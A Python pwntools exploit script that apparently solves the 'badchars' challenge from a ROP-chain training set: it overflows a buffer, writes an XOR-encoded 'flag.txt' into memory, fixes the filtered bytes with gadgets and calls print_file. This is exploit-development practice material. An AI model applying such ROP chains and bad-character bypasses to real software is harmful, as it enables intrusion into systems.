#! /usr/bin/env python2
from pwn import *
import string

gadget1 = 0x040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

gadget2 = 0x0400634 # mov qword ptr [r13], r12 ; ret

gadget3 = 0x04006A3 # pop rdi ; ret

gadget4 = 0x0400628 # xor byte ptr [r15], r14b ; ret

gadget5 = 0x04006a0 # pop r14 ; pop r15 ; ret

dataSect = 0x0601028 + 0x8 # data section + 8

print_file_plt = 0x400510

payload = 'A'*40

badchars = ['a', 'g', 'x', '.']

# xor_pair(b'flag.txt')
# b'gm`f/uyu'

# '`' ^ 1 = 'a'
# 'f' ^ 1 = 'g'
# 'y' ^ 1 = 'x'
# '/' ^ 1 = '.'
r15 = b'fl`f/tyt'
# write xor string to data section then xor the byte to obtain right string
payload += p64(gadget1) + r15 + p64(dataSect) + p64(0x1) + p64(dataSect+2) + p64(gadget2) + p64(gadget4)
# 'f' ^ 1 = 'g'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+3) + p64(gadget4)
# '/' ^ 1 = '.'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+4) + p64(gadget4)
# 'y' ^ 1 = 'x'
payload += p64(gadget5) + p64(0x1) + p64(dataSect+6) + p64(gadget4)
# pop rdi
payload += p64(gadget3) + p64(dataSect)
# print_file
payload += p64(print_file_plt)

#print(payload)

elf = ELF('./badchars')

proc = elf.process()

proc.recvuntil('> ')

proc.sendline(payload)

proc.interactive()
